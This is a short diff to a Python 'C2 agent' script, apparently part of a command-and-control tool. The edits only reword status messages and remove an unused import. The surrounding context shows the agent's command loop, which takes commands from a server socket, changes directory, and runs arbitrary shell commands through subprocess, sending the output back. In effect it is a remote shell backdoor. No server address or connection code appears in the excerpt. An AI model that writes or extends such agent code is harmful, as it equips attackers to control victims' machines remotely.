@@ -4,7 +4,6 @@ import os
 import socket
 import getpass
 import argparse
-from time import sleep
 
 parser = argparse.ArgumentParser(description="C2 agent configuration to communicate with server")
 parser._action_groups.pop()
@@ -48,7 +47,7 @@ def main():
                     path = " ".join(incoming.split(" ")[1:])
                     os.chdir(path)
                     CWD = os.getcwd()
-                    session.sendall(f"Changed directory to {CWD}\n")
+                    session.sendall(f"Current directory: {CWD}\n")
                 elif head == "!c":
                     command = " ".join(incoming.split(" ")[1:])
                     output = subprocess.getoutput(command)
@@ -57,7 +56,7 @@ def main():
                     else:
                         session.sendall(output + "\n")
                 else:
-                    session.sendall("Invalid.\n")
+                    session.sendall("[!] Invalid.\n")
             except Exception as ex:
                 session.sendall("[!] " + str(ex) + "\n")
 
